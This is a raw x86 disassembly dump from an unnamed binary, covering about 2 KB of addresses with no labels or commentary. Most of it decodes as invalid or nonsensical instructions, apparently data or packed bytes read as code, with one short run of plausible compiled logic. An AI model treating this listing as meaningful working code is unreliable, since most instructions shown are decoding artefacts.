  410d05:	dec    ebx
  410d06:	adc    ebx,DWORD PTR [edx-0x7edbe19]
  410d0c:	cmp    BYTE PTR [esi+0x50],bl
  410d0f:	xchg   ebp,eax
  410d10:	repz inc ebx
  410d12:	or     al,0x5
  410d14:	fs aad 0xd1
  410d17:	js     0x410d4e
  410d19:	out    0x18,al
  410d1b:	popa   
  410d1c:	std    
  410d1d:	cmp    al,BYTE PTR [ebx+ecx*1+0x63]
  410d21:	jle    0x410cd4
  410d23:	or     ebx,DWORD PTR [ebx+0x9536419]
  410d29:	jle    0x410d0e
  410d2b:	add    ecx,DWORD PTR [ebx-0x76]
  410d2e:	out    0xea,eax
  410d30:	or     al,0x8b
  410d32:	sbb    edi,DWORD PTR [edi-0x458cbf6f]
  410d38:	jl     0x410cc6
  410d3a:	sar    BYTE PTR [ecx+0x54],1
  410d3d:	imul   ecx,DWORD PTR [ebx+0x2ddc7520],0xfffffff5
  410d44:	jge    0x410daf
  410d46:	xor    DWORD PTR [ebp+ebx*1+0x3f],0xffffff8e
  410d4b:	imul   esp,eax,0x72
  410d4e:	lahf   
  410d4f:	mov    esp,0x57f3f6a8
  410d54:	scas   al,BYTE PTR es:[edi]
  410d55:	outs   dx,DWORD PTR ds:[esi]
  410d56:	clc    
  410d57:	push   ss
  410d58:	push   0x37
  410d5a:	and    BYTE PTR [ebp+edi*4-0x62bf9082],dl
  410d61:	pop    ss
  410d62:	nop
  410d63:	ds sbb DWORD PTR fs:[ebx],eax
  410d67:	cs rol bl,0x80
  410d6b:	(bad)  
  410d6c:	mov    eax,ds:0xd8178b1
  410d71:	and    eax,0x6a7d97ec
  410d76:	cmp    bh,BYTE PTR [eax-0x52afb246]
  410d7c:	call   0xf70aa752
  410d81:	sbb    BYTE PTR [ebp+edx*2-0x5f7e8829],bl
  410d88:	and    eax,0x226848aa
  410d8d:	pop    esi
  410d8e:	mov    ecx,edi
  410d90:	add    bh,BYTE PTR [edi+ebp*8]
  410d93:	out    dx,eax
  410d94:	psllq  mm7,QWORD PTR [edi-0x57523ea0]
  410d9b:	mov    ah,0x33
  410d9d:	mov    ds:0x7551ed92,al
  410da2:	sahf   
  410da3:	add    al,0x57
  410da5:	loope  0x410d72
  410da7:	(bad)  
  410da8:	int3   
  410da9:	mov    ah,0x7f
  410dab:	jb     0x410e02
  410dad:	(bad)  
  410dae:	pop    ebp
  410daf:	fcomp  st(5)
  410db1:	lds    ebp,FWORD PTR [esi]
  410db3:	jno    0x410d72
  410db5:	cmp    al,0x1d
  410db7:	repnz mov eax,DWORD PTR [esi]
  410dba:	xor    edx,0xc0000000
  410dc0:	mov    DWORD PTR [ebp+0x14],edx
  410dc3:	mov    edx,DWORD PTR [esi+0x4]
  410dc6:	xor    eax,0xba699573
  410dcb:	xor    ecx,edx
  410dcd:	shrd   eax,ecx,0x2
  410dd1:	or     eax,DWORD PTR [ebp+0x10]
  410dd4:	shr    ecx,0x2
  410dd7:	mov    DWORD PTR [ebp+0x8],eax
  410dda:	mov    eax,ecx
  410ddc:	or     eax,DWORD PTR [ebp+0x14]
  410ddf:	mov    ecx,DWORD PTR [ebx]
  410de1:	mov    edx,DWORD PTR [ebx+0x4]
  410de4:	push   eax
  410de5:	push   DWORD PTR [ebp+0x8]
  410de8:	push   edx
  410de9:	push   ecx
  410dea:	call   0x41dfb1
  410def:	mov    eax,DWORD PTR [esi]
  410df1:	mov    ecx,DWORD PTR [esi+0x4]
  410df4:	shrd   eax,ecx,0x2
  410df8:	shr    ecx,0x2
  410dfb:	shr    edx,0x1e
  410dfe:	jmp    0x411388
  410e03:	ret    0x707f
  410e06:	and    eax,0x58c21820
  410e0b:	cmp    DWORD PTR [ebx-0x70],ebp
  410e0e:	outs   dx,BYTE PTR ds:[esi]
  410e0f:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  410e11:	pop    es
  410e12:	mov    ah,0x9b
  410e14:	push   eax
  410e15:	push   ss
  410e16:	push   ss
  410e17:	cmp    eax,0x80161604
  410e1c:	or     DWORD PTR [esi+0x28e3a4e5],0x8c259fee
  410e26:	jo     0xe08d0ace
  410e2c:	outs   dx,DWORD PTR ds:[esi]
  410e2d:	xor    eax,0xf6b19554
  410e32:	xor    al,dh
  410e34:	jl     0x410e04
  410e36:	in     eax,0xcb
  410e38:	xchg   ebx,eax
  410e39:	xchg   edi,eax
  410e3a:	aad    0x83
  410e3c:	xor    DWORD PTR [eax-0x11],edx
  410e3f:	fwait
  410e40:	inc    ebx
  410e41:	mov    esp,0x67f7018f
  410e46:	add    BYTE PTR [ebp-0x503f96b6],0x7f
  410e4d:	pop    ss
  410e4e:	push   edx
  410e4f:	rcr    edx,0x1f
  410e52:	js     0x410e89
  410e54:	cmp    al,0x78
  410e56:	es je  0x410e23
  410e59:	dec    bp
  410e5b:	jge    0x410e68
  410e5d:	cwde   
  410e5e:	or     BYTE PTR [edx-0x32306173],ch
  410e64:	mov    dl,0xe9
  410e66:	in     eax,dx
  410e67:	stos   DWORD PTR es:[edi],eax
  410e68:	inc    edi
  410e69:	mov    edx,0x68043021
  410e6e:	xor    al,bl
  410e70:	popf   
  410e71:	rcr    BYTE PTR [ebp+0x3b],cl
  410e74:	int    0xa7
  410e76:	std    
  410e77:	mov    eax,0x2e0f4ae0
  410e7c:	pop    esp
  410e7d:	cmc    
  410e7e:	jp     0x410e62
  410e80:	sub    esi,DWORD PTR [esi]
  410e82:	adc    edx,DWORD PTR [edi-0x66]
  410e85:	test   DWORD PTR [edx-0x6a7f82d0],0x3b6fa466
  410e8f:	or     cl,BYTE PTR [esi+0x4d]
  410e92:	outs   dx,DWORD PTR ds:[esi]
  410e93:	das    
  410e94:	xchg   ebp,eax
  410e95:	sahf   
  410e96:	rcl    BYTE PTR [esp+esi*1+0x186a1c21],0x50
  410e9e:	cdq    
  410e9f:	and    eax,0x22c577
  410ea4:	cmc    
  410ea5:	into   
  410ea6:	dec    eax
  410ea7:	dec    ebx
  410ea8:	enter  0x6b8a,0x78
  410eac:	mov    al,0x1a
  410eae:	loop   0x410e63
  410eb0:	sbb    DWORD PTR [edx],edi
  410eb2:	dec    edi
  410eb3:	or     BYTE PTR [edx+edi*4-0x45],dh
  410eb7:	out    0xac,eax
  410eb9:	xor    al,0xf6
  410ebb:	xchg   esp,eax
  410ebc:	mov    edi,0x2d8dd365
  410ec1:	jmp    0x8f95:0x86d8c613
  410ec8:	inc    esi
  410ec9:	mov    dl,0xd
  410ecb:	mov    dh,0x20
  410ecd:	test   DWORD PTR [ebp+0xde35515],edx
  410ed3:	and    DWORD PTR [edi-0x31],edi
  410ed6:	test   eax,0xf977ea98
  410edb:	icebp  
  410edc:	adc    eax,0xebd0f357
  410ee1:	inc    esi
  410ee2:	mov    ds:0x63f1e943,eax
  410ee7:	dec    edx
  410ee8:	push   eax
  410ee9:	jns    0x410f19
  410eeb:	cmp    ecx,DWORD PTR [ebx+0x53]
  410eee:	out    dx,eax
  410eef:	and    DWORD PTR [eax-0x5e],esp
  410ef2:	fidivr DWORD PTR [esi]
  410ef4:	call   0x49d0e8c9
  410ef9:	mov    edx,0x761f0e4f
  410efe:	nop
  410eff:	sub    eax,0xbad0d9b9
  410f04:	sbb    DWORD PTR [edx+0x74],esp
  410f07:	bound  ebp,QWORD PTR [eax]
  410f09:	pop    ecx
  410f0a:	xchg   dx,ax
  410f0c:	in     eax,0xe3
  410f0e:	inc    edi
  410f0f:	cdq    
  410f10:	ds sbb bl,dl
  410f13:	xchg   BYTE PTR [bp-0x7a],dl
  410f17:	jge    0x410f15
  410f19:	pop    ecx
  410f1a:	xchg   ecx,eax
  410f1b:	mov    bl,BYTE PTR [edx-0x44]
  410f1e:	xchg   esp,eax
  410f1f:	jns    0x410f9f
  410f21:	push   edx
  410f22:	or     DWORD PTR [ebp+0x70],ebp
  410f25:	imul   ebp,DWORD PTR [esi+edx*8-0x27],0xffffffda
  410f2a:	ret    0x84b2
  410f2d:	lods   eax,DWORD PTR ds:[esi]
  410f2e:	mov    dh,0x7b
  410f30:	and    ebx,DWORD PTR [edx]
  410f32:	pop    eax
  410f33:	push   ss
  410f34:	inc    esp
  410f35:	mov    bl,0x88
  410f37:	scas   eax,DWORD PTR es:[edi]
  410f38:	stos   BYTE PTR es:[edi],al
  410f39:	pop    ebx
  410f3a:	std    
  410f3b:	ins    DWORD PTR es:[edi],dx
  410f3c:	mov    ah,0x18
  410f3e:	lock inc esi
  410f40:	repz xchg edi,eax
  410f42:	mov    edx,0xb7880b5c
  410f47:	dec    ebp
  410f48:	test   DWORD PTR [edx],0x794ebd93
  410f4e:	or     al,BYTE PTR [edx-0x9ff1524]
  410f54:	ja     0x410f65
  410f56:	dec    eax
  410f57:	sbb    ch,BYTE PTR [ebx-0x7329d3bb]
  410f5d:	dec    ebx
  410f5e:	out    dx,al
  410f5f:	adc    BYTE PTR [eax+0x16347794],ch
  410f65:	sbb    BYTE PTR [ebp-0xf],bl
  410f68:	ss and eax,0x6380adf7
  410f6e:	sahf   
  410f6f:	and    BYTE PTR [edi-0x22aba8b9],ah
  410f75:	retf   0x7168
  410f78:	pop    es
  410f79:	lahf   
  410f7a:	ja     0x410fd3
  410f7c:	outs   dx,DWORD PTR ds:[esi]
  410f7d:	fcmovu st,st(4)
  410f7f:	pop    es
  410f80:	in     eax,0x15
  410f82:	jbe    0x410fb3
  410f84:	dec    esp
  410f85:	pop    es
  410f86:	aas    
  410f87:	pop    ecx
  410f88:	push   ecx
  410f89:	popa   
  410f8a:	arpl   WORD PTR [ecx+edi*2],ax
  410f8d:	push   cs
  410f8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f8f:	or     bh,0xe9
  410f92:	push   0x922dfb2a
  410f97:	and    ecx,DWORD PTR [eax]
  410f99:	popa   
  410f9a:	out    0x46,eax
  410f9c:	pop    es
  410f9d:	test   BYTE PTR [edx-0x44],dl
  410fa0:	ss jmp 0xb2a20d93
  410fa6:	sub    DWORD PTR [ebx+0x595c5df7],0x7843cd69
  410fb0:	add    BYTE PTR [edi+ebx*4-0x35c7a22b],dh
  410fb7:	test   eax,0xc2a41550
  410fbc:	jns    0x410f59
  410fbe:	nop
  410fbf:	adc    ebx,DWORD PTR gs:[edi+0x3f84952a]
  410fc6:	sbb    DWORD PTR [edx+0x41faaf5b],esp
  410fcc:	push   edx
  410fcd:	(bad)  
  410fce:	repnz mov dh,0xbd
  410fd1:	ret    0x5c2b
  410fd4:	jg     0x410f96
  410fd6:	lods   eax,DWORD PTR ds:[esi]
  410fd7:	pushf  
  410fd8:	push   0x690763d2
  410fdd:	adc    al,BYTE PTR [ebx+0x5e475d0c]
  410fe3:	sbb    al,BYTE PTR es:[edi+0x43668826]
  410fea:	sub    DWORD PTR [edx+edi*1+0x3],eax
  410fee:	pushf  
  410fef:	or     ebx,ecx
  410ff1:	sbb    al,0xa9
  410ff3:	leave  
  410ff4:	fdiv   QWORD PTR [esi-0x54]
  410ff7:	(bad)  
  410ff9:	pushf  
  410ffa:	xor    BYTE PTR ds:0xf58316c5,bl
  411000:	cmc    
  411001:	adc    DWORD PTR [edi+0x66],eax
  411004:	les    esi,FWORD PTR [esi-0x528eb339]
  41100a:	inc    esi
  41100b:	jge    0x411038
  41100d:	lds    esp,FWORD PTR [edi+0x7f6527fa]
  411013:	ja     0x411042
  411015:	lock in eax,0x40
  411018:	test   al,dh
  41101a:	mov    cl,0xcf
  41101c:	and    esi,DWORD PTR [ebx-0x7ea215a1]
  411022:	push   cs
  411023:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411024:	add    al,0xa5
  411026:	add    bl,BYTE PTR [edx]
  411028:	adc    dh,bl
  41102a:	mov    esi,0x7844dbe2
  41102f:	clc    
  411030:	push   ebp
  411031:	push   0xffffff98
  411033:	jmp    0x517:0x92bfe846
  41103a:	and    ecx,DWORD PTR [eax+0x3]
  41103d:	and    cl,ah
  41103f:	or     dl,BYTE PTR [esi-0x3fcf2f5e]
  411045:	mov    WORD PTR [edi],ss
  411047:	(bad)  
  411048:	(bad)  
  41104a:	add    eax,0x3895ed7c
  41104f:	daa    
  411050:	into   
  411051:	dec    esi
  411052:	outs   dx,BYTE PTR ds:[esi]
  411053:	sub    eax,0x99e35a1f
  411058:	ret    0x7b22
  41105b:	call   0xf27e:0x1098d6bc
  411062:	or     edi,ebx
  411064:	imul   ebp,DWORD PTR [edi],0xb96cdc6b
  41106a:	mov    edi,0xb968e133
  41106f:	sahf   
  411070:	bound  edi,QWORD PTR [ecx+0x74c84d7b]
  411076:	loope  0x41108e
  411078:	mov    eax,0x4efc74b5
  41107d:	call   0x266:0x1d684f8d
  411084:	mov    ?,WORD PTR [ecx]
  411086:	ins    BYTE PTR es:[edi],dx
  411087:	popf   
  411088:	fsub   QWORD PTR [eax+edi*1]
  41108b:	loop   0x411101
  41108d:	jne    0x4110e6
  41108f:	retf   
  411090:	retf   
  411091:	fst    DWORD PTR gs:[ecx+0x3ff98aa6]
  411098:	push   ecx
  411099:	mov    ds:0x4ccf3f1f,al
  41109e:	add    DWORD PTR [edi-0x5a],edi
  4110a1:	push   esp
  4110a2:	dec    esp
  4110a3:	popf   
  4110a4:	icebp  
  4110a5:	sbb    eax,0xa0556e65
  4110aa:	add    al,0x68
  4110ac:	push   cs
  4110ad:	jbe    0x4110c6
  4110af:	sti    
  4110b0:	pop    edx
  4110b1:	les    esp,FWORD PTR [esi-0x3092b93a]
  4110b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110b8:	fisub  DWORD PTR [edx+eiz*4+0x6a]
  4110bc:	into   
  4110bd:	dec    DWORD PTR gs:[ecx+0x4b697120]
  4110c4:	jmp    0x411140
  4110c6:	rcr    BYTE PTR [eax+0x7893b647],cl
  4110cc:	cld    
  4110cd:	and    DWORD PTR ds:0xf617cb45,0x43
  4110d4:	sbb    BYTE PTR [eax-0x2b9cbfeb],al
  4110da:	ret    
  4110db:	mov    dh,0x66
  4110dd:	repz or ch,BYTE PTR [edi]
  4110e0:	ficomp DWORD PTR [ecx+0x70]
  4110e3:	jne    0x411128
  4110e5:	stos   DWORD PTR es:[edi],eax
  4110e6:	push   cs
  4110e7:	aaa    
  4110e8:	sbb    al,0xc9
  4110ea:	inc    esi
  4110eb:	pop    ecx
  4110ec:	cwde   
  4110ed:	mov    WORD PTR [edx+esi*8],ss
  4110f0:	mov    fs,WORD PTR [ebp-0x69]
  4110f3:	add    BYTE PTR [esi+eax*1-0x47],bl
  4110f7:	bt     DWORD PTR [eax+0x3a],edx
  4110fb:	jg     0x4110e5
  4110fd:	ins    BYTE PTR es:[edi],dx
  4110fe:	inc    edi
  4110ff:	nop
  411100:	jno    0x411109
  411102:	dec    BYTE PTR [ecx-0x5a9c8d15]
  411108:	adc    bh,0x95
  41110b:	mov    edx,0x75b6d55f
  411110:	add    esp,DWORD PTR ds:0x1c1dab29
  411116:	and    edi,DWORD PTR [ecx+0x0]
  411119:	mov    ebp,0x9638cce8
  41111e:	xor    cl,BYTE PTR [esi+0x1c64361c]
  411124:	mov    ds:0xa8240871,eax
  411129:	ds (bad) 
  41112b:	jnp    0x411197
  41112d:	xor    esi,DWORD PTR [ebp-0x71f032ab]
  411133:	sub    al,0xf8
  411135:	mov    eax,ds:0x4652083f
  41113a:	jnp    0x411107
  41113c:	stos   DWORD PTR es:[edi],eax
  41113d:	or     edx,ebx
  41113f:	jns    0x411150
  411141:	xchg   DWORD PTR ds:0x818ae337,ecx
  411147:	fsubr  QWORD PTR ds:0xb33a6bbb
  41114d:	push   ds
  41114e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41114f:	sbb    dh,BYTE PTR [ebx]
  411151:	cwde   
  411152:	ins    DWORD PTR es:[edi],dx
  411153:	and    edi,DWORD PTR [edi+0x64a2c754]
  411159:	adc    DWORD PTR [ebp-0x7564dd37],esi
  41115f:	inc    edi
  411160:	je     0x41114f
  411162:	mov    al,ds:0xe7a93972
  411167:	sub    eax,0x92ad343c
  41116c:	outs   dx,DWORD PTR ds:[esi]
  41116d:	fldenv [edx-0x162b6bff]
  411173:	fmul   QWORD PTR [edi]
  411175:	sub    al,0x64
  411177:	shl    cl,cl
  411179:	pop    edi
  41117a:	xchg   dh,bh
  41117c:	mov    ebx,0x6c108ff0
  411181:	mov    al,BYTE PTR [esi+0x34]
  411184:	into   
  411185:	fsubr  QWORD PTR [ebx+0x17a70734]
  41118b:	out    0xe5,eax
  41118d:	and    eax,0x4f80dbf9
  411192:	sbb    DWORD PTR [ecx+esi*1-0x6ae8a990],0xf99d62e9
  41119d:	or     eax,0x29325c33
  4111a2:	shl    BYTE PTR [ecx],cl
  4111a4:	mov    gs,WORD PTR [esi+0x13]
  4111a7:	pop    eax
  4111a8:	jmp    0x41118b
  4111aa:	cs jae 0x4111ea
  4111ad:	(bad)  
  4111ae:	or     ebp,edi
  4111b0:	or     ch,BYTE PTR [esi+0xc]
  4111b3:	or     esp,DWORD PTR [esi-0x52]
  4111b6:	push   eax
  4111b7:	shl    DWORD PTR [esi-0x17704615],cl
  4111bd:	push   ecx
  4111be:	jle    0x4111e7
  4111c0:	jp     0x41114b
  4111c2:	fs jae 0x411241
  4111c5:	cli    
  4111c6:	mov    al,ds:0x59f7c8
  4111cb:	hlt    
  4111cc:	xchg   ecx,edx
  4111ce:	add    bh,bl
  4111d0:	xor    dl,dl
  4111d2:	inc    eax
  4111d3:	xchg   esp,eax
  4111d4:	or     cl,bl
  4111d6:	out    0xdd,eax
  4111d8:	and    DWORD PTR [di+0x4],edi
  4111dc:	dec    ebx
  4111dd:	test   al,0x24
  4111df:	adc    BYTE PTR [eax],bh
  4111e1:	pop    es
  4111e2:	retf   0x8e45
  4111e5:	or     ch,BYTE PTR [edi+esi*4-0x44]
  4111e9:	dec    edx
  4111ea:	cmp    eax,ebx
  4111ec:	(bad)
  4111ef:	inc    ecx
  4111f0:	add    BYTE PTR [edi+0x48df0e4f],bh
  4111f6:	mov    ebp,0xe6210b02
  4111fb:	stos   DWORD PTR es:[edi],eax
  4111fc:	push   esi
  4111fd:	jg     0x41119f
  4111ff:	clc    
  411200:	out    dx,eax
  411201:	push   eax
  411202:	xchg   ch,ah
  411204:	adc    al,BYTE PTR [edi-0x39d97b6f]
  41120a:	shl    esp,cl
  41120c:	push   0x4
  41120e:	or     edi,esp
  411210:	inc    edx
  411211:	add    bl,dh
  411213:	fnstenv [esi]
  411215:	mov    ah,0x8
  411217:	inc    eax
  411218:	push   ds
  411219:	setnp  BYTE PTR [edx-0x3395bc91]
  411220:	test   BYTE PTR [edx+ecx*1-0x45e60f60],bh
  411227:	pop    ecx
  411228:	pop    ebx
  411229:	mov    ecx,0xd1b34357
  41122e:	gs inc ebp
  411230:	sbb    BYTE PTR [ebx],al
  411232:	rol    BYTE PTR [ebx-0x243ac010],cl
  411238:	jge    0x41126c
  41123a:	mov    al,0x31
  41123c:	lds    edx,FWORD PTR [ebx+0x30]
  41123f:	mov    bl,0x91
  411241:	mov    esp,0x19a04953
  411246:	dec    ebp
  411247:	jmp    0x411235
  411249:	pop    ecx
  41124a:	mov    eax,0x61613f04
  41124f:	mov    esi,0x50b8c653
  411254:	stos   BYTE PTR es:[edi],al
  411255:	and    DWORD PTR [edi],ebx
  411257:	sbb    ch,dh
  411259:	stc    
  41125a:	pop    ebp
  41125b:	adc    DWORD PTR [edi+ebx*4],0x58
  41125f:	jmp    0xd324:0x10ed57b5
  411266:	dec    ebp
  411267:	dec    ecx
  411268:	mov    edx,0x4f42a579
  41126d:	(bad)  
  41126e:	jne    0x411266
  411270:	mov    dl,0xa
  411272:	stc    
  411273:	xchg   esi,eax
  411274:	dec    edi
  411275:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411276:	cdq    
  411277:	fld    QWORD PTR ds:0xabb120ef
  41127d:	push   esp
  41127e:	sub    dh,bh
  411280:	cmc    
  411281:	or     BYTE PTR [ebx],0x2d
  411284:	xor    al,0x9
  411286:	out    dx,eax
  411287:	cmp    al,0xb3
  411289:	fbld   TBYTE PTR [ebp+0x42ab2b51]
  41128f:	xchg   bl,cl
  411291:	call   0x49e2:0xb6a9407b
  411298:	push   esi
  411299:	aas    
  41129a:	js     0x41126b
  41129c:	mov    esi,es
  41129e:	adc    ebp,DWORD PTR [esi-0x6c]
  4112a1:	jo     0x41124b
  4112a3:	jg     0x411283
  4112a5:	stc    
  4112a6:	add    esp,edi
  4112a8:	inc    ebp
  4112a9:	sar    BYTE PTR ss:[ecx+0xffce58d],1
  4112b0:	data16 lods al,BYTE PTR ds:[esi]
  4112b2:	jno    0x411333
  4112b4:	cmc    
  4112b5:	mov    cl,0x18
  4112b7:	xor    al,0x74
  4112b9:	cmpxchg BYTE PTR [eax+0x4c51a25],ch
  4112c0:	inc    ecx
  4112c1:	mov    BYTE PTR ds:0x25bf5c3b,ch
  4112c7:	scas   eax,DWORD PTR es:[edi]
  4112c8:	pop    ebp
  4112ca:	inc    eax
  4112cb:	mov    es,WORD PTR ds:0x4f7e657a
  4112d1:	adc    BYTE PTR [esi],dl
  4112d3:	ins    DWORD PTR es:[edi],dx
  4112d4:	mov    cl,0x4b
  4112d6:	dec    esi
  4112d7:	jge    0x411346
  4112d9:	test   eax,0xffb3fc73
  4112de:	mov    edx,?
  4112e0:	mov    ds:0xaa357294,eax
  4112e5:	repz imul ebx,DWORD PTR [esi-0x5d],0xffffffbe
  4112ea:	(bad)  
  4112eb:	jne    0x411309
  4112ed:	cld    
  4112ee:	adc    bl,ch
  4112f0:	xchg   edx,eax
  4112f1:	aas    
  4112f2:	push   ds
  4112f3:	shl    dl,1
  4112f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112f6:	or     dl,BYTE PTR [eax+0x7d]
  4112f9:	mov    ch,0x1e
  4112fb:	add    eax,0x5603886b
  411300:	mov    es,WORD PTR [ebp+0x4e]
  411303:	or     ecx,DWORD PTR [ecx]
  411305:	xchg   ebx,eax
  411306:	dec    esi
  411307:	cmp    dl,0xbb
  41130a:	jle    0x4112ad
  41130c:	jnp    0x4112b8
  41130e:	aaa    
  41130f:	jmp    0xe6ea42b8
  411314:	ret    0x78ce
  411317:	add    DWORD PTR [ebp+0x4e04a03c],esi
  41131d:	pop    ds
  41131e:	xor    BYTE PTR [ecx+0x18d1c5cc],bl
  411324:	adc    al,0x9e
  411326:	test   eax,0xc181d8a4
  41132b:	add    BYTE PTR [ebx],cl
  41132d:	rol    DWORD PTR [ebx+0x16b65615],1
  411333:	mov    esp,0xb208f9e9
  411338:	sbb    al,0x46
  41133a:	call   0xfbcab096
  41133f:	ret    
  411340:	sar    DWORD PTR [ecx+0x61416500],1
  411346:	pop    es
  411347:	adc    eax,0x3e82d9de
  41134c:	ret    
  41134d:	call   0xf586bb05
  411352:	cs ins BYTE PTR es:[edi],dx
  411354:	inc    ebp
  411355:	jbe    0x41139d
  411357:	pusha  
  411358:	push   esp
  411359:	repnz test eax,0xf167b5eb
  41135f:	or     eax,0x32091215
  411364:	sub    bh,BYTE PTR [eax-0x58]
  411367:	inc    ebp
  411368:	mov    ah,0xb0
  41136a:	sub    edx,edi
  41136c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41136d:	mov    dh,dh
  41136f:	jno    0x41134d
  411371:	sbb    esp,DWORD PTR [esi+ebp*8-0x3d]
  411375:	sbb    ah,BYTE PTR [esi+0x6016f08e]
  41137b:	sub    dl,0x41
  41137e:	fimul  DWORD PTR [ebx-0x7f]
  411381:	ja     0x4113b2
  411383:	icebp  
  411384:	fcom   DWORD PTR [eax+0x32]
  411387:	jmp    0x41130a
  411389:	icebp  
  41138a:	jbe    0x41132e
  41138c:	add    ah,bh
  41138e:	push   ecx
  41138f:	xor    eax,edi
  411391:	mov    DWORD PTR [ebp+0x10],edx
  411394:	jmp    0x41191e
  411399:	jl     0x4113d8
  41139b:	mov    ds:0x1459a28b,eax
  4113a0:	inc    eax
  4113a1:	jmp    DWORD PTR [eax-0x3ec44bc0]
  4113a7:	(bad)  
  4113a8:	scas   al,BYTE PTR es:[edi]
  4113a9:	rol    BYTE PTR [esi+0x16],1
  4113ac:	push   ss
  4113ad:	cmp    eax,0xa9161604
  4113b2:	mov    cl,0x83
  4113b4:	sub    eax,0x832d5d48
  4113b9:	jge    0x41142b
  4113bb:	aaa    
  4113bc:	xor    bl,BYTE PTR [ebx]
  4113be:	ret    0xbc91
  4113c1:	cmp    al,0x53
  4113c3:	enter  0x78e9,0xba
  4113c7:	in     al,0xb
  4113c9:	imul   ebp,ebp,0x3c
  4113cc:	sti    
  4113cd:	cdq    
  4113ce:	inc    eax
  4113cf:	daa    
  4113d0:	and    eax,DWORD PTR [esi]
  4113d2:	int    0xac
  4113d4:	mov    ds:0x251c087a,eax
  4113d9:	addr16 pop eax
  4113db:	ror    ch,1
  4113dd:	xchg   esi,eax
  4113de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4113df:	cmp    bl,BYTE PTR [esi-0x22]
  4113e2:	xchg   esi,eax
  4113e3:	ret    
  4113e4:	mov    ah,BYTE PTR [ebx-0x59]
  4113e7:	int3   
  4113e8:	jbe    0x411425
  4113ea:	mov    bh,0x25
  4113ec:	cmp    dh,ch
  4113ee:	pop    ds
  4113ef:	xchg   edi,eax
  4113f0:	imul   edi,DWORD PTR [esi],0x6b00670c
  4113f6:	push   ds
  4113f7:	jns    0x41141a
  4113f9:	add    BYTE PTR [ebp-0x3f],0x5f
  4113fd:	jne    0x4113aa
  4113ff:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  411401:	xchg   edx,eax
  411402:	(bad)  
  411403:	mov    eax,DWORD PTR [edx-0x299b6cf7]
  411409:	inc    ebx
  41140a:	outs   dx,BYTE PTR ds:[esi]
  41140b:	(bad)  
  41140c:	lea    ebx,[eax-0x3d]
  41140f:	jno    0x41139b
  411411:	ror    DWORD PTR [ecx],cl
  411413:	ror    BYTE PTR [esi+0x6998970a],cl
  411419:	add    al,0xf5
  41141b:	scas   eax,DWORD PTR es:[edi]
  41141c:	rcl    BYTE PTR [ecx+0x8],0x67
  411420:	inc    edx
  411421:	ret    
  411422:	dec    BYTE PTR [ecx-0x7c386179]
  411428:	xchg   esi,eax
  411429:	xor    al,0xf0
  41142b:	add    BYTE PTR ss:[edi],cl
  41142e:	xor    eax,DWORD PTR [ecx+0x21]
  411431:	call   0xbed8bb51
  411436:	mov    esi,0x2d65601f
  41143b:	pop    ecx
  41143c:	push   ebx
  41143d:	inc    edi
  41143e:	adc    DWORD PTR [edx+0x56],0xffffffc3
  411442:	sbb    DWORD PTR [ebx+edx*4-0x67e0b640],0x2fa93043
  41144d:	repnz add DWORD PTR ss:[edi+0x7c],eax
  411452:	out    0xd,eax
  411454:	mov    ss,WORD PTR [edx+0x3b]
  411457:	push   eax
  411458:	jne    0x41145a
  41145a:	ret    
  41145b:	(bad)  
  41145c:	xor    BYTE PTR [edi+ecx*8+0x63],dh
  411460:	outs   dx,BYTE PTR ss:[esi]
  411462:	xor    bh,BYTE PTR [edi]
  411464:	and    DWORD PTR [ecx-0x5cfa8c03],ecx
  41146a:	mov    al,0x82
  41146c:	clc    
  41146d:	mul    BYTE PTR [esi+ebp*1-0x7e]
  411471:	hlt    
  411472:	lahf   
  411473:	ret    0xbe1b
  411476:	jno    0x411446
  411478:	call   0x6ce4:0x77a43f53
  41147f:	inc    ebx
  411480:	in     al,dx
  411481:	adc    BYTE PTR [ebx+0x180cbcfd],dl
  411487:	cs pop es
  411489:	jno    0x4114db
  41148b:	push   eax
  41148c:	scas   eax,DWORD PTR es:[edi]
  41148d:	cli    
  41148e:	lock mov ah,BYTE PTR [esi]
  411491:	jp     0x4114ea
  411493:	cli    
  411494:	push   esp
  411495:	shr    BYTE PTR [ebp-0x764e51c],0xcc
  41149c:	xchg   ecx,eax
  41149d:	inc    ebx
  41149e:	sbb    ch,cl
  4114a0:	ins    BYTE PTR es:[edi],dx
  4114a1:	fcompp 
  4114a3:	mov    ch,0x92
  4114a5:	add    eax,0x9bea2f71
  4114aa:	into   
  4114ab:	mov    al,ds:0xec24684e
  4114b0:	cmp    al,0xb4
  4114b2:	push   0xa387cc11
  4114b7:	push   ss
  4114b8:	out    0x9,eax
  4114ba:	(bad)  [ecx+0x19315464]
  4114c0:	mov    ecx,0xcfd8bddd
  4114c5:	enter  0xed74,0xf7
  4114c9:	add    DWORD PTR [esp+esi*8-0x13],ebp
  4114cd:	jo     0x411544
  4114cf:	adc    ah,bl
  4114d1:	fmul   QWORD PTR ds:0x549a6f30
  4114d7:	fs cwde 
  4114d9:	mov    gs,esp
  4114db:	mov    ch,0xda
  4114dd:	call   0x4fe37406
  4114e2:	pop    ss
  4114e3:	inc    ecx
  4114e4:	jno    0x411497
  4114e6:	xchg   edi,eax
  4114e7:	cmp    eax,0xf87b020b
  4114ec:	(bad)  
  4114ed:	pop    ds
  4114ee:	mov    ds:0xead3bbe6,al
  4114f3:	rcl    BYTE PTR [eax+ebx*8],cl
  4114f6:	push   ss
  4114f7:	rol    BYTE PTR [eax-0x10eddd4d],cl
  4114fd:	pusha  
  4114fe:	or     al,0x7f
  411500:	(bad)  
  411501:	inc    ebp
  411502:	or     al,0x8c
  411504:	and    esp,ebp
  411506:	push   0xffffffe8
  411508:	and    eax,0xeeee548d
  41150d:	gs pop eax
  41150f:	ret    0x4a61
  411512:	lahf   
  411513:	xchg   edx,eax
  411514:	sbb    al,0x17
  411516:	faddp  st(0),st
  411518:	stos   BYTE PTR es:[edi],al
  411519:	mov    edx,0xff9e549d
  41151e:	pop    edx
  41151f:	into   
  411520:	leave  
  411521:	nop
  411522:	sbb    al,0x12
  411524:	push   ss
  411525:	pop    ss
